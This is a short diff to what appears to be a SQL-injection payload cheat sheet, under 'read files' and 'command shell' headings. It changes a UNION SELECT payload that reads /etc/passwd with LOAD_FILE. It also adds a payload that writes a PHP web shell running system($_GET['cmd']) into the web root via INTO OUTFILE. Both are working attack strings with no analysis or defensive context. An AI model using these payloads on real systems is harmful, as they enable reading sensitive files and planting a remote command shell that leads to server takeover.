@@ -36,5 +36,9 @@ Basic:
 # read files
 1: 
 ```
-'union select 1,LOAD_FILE('/etc/passwd') from webapp.queue-- -
+<VALUE>'union select 1,LOAD_FILE('/etc/passwd') from webapp.queue-- -
+```
+# command shell
+```
+<VALUE>'union select 1,'<?php system($_GET['cmd']) ?> INTO OUTFILE '/var/www/html/shell1.php' from webapp.queue-- -
 ```
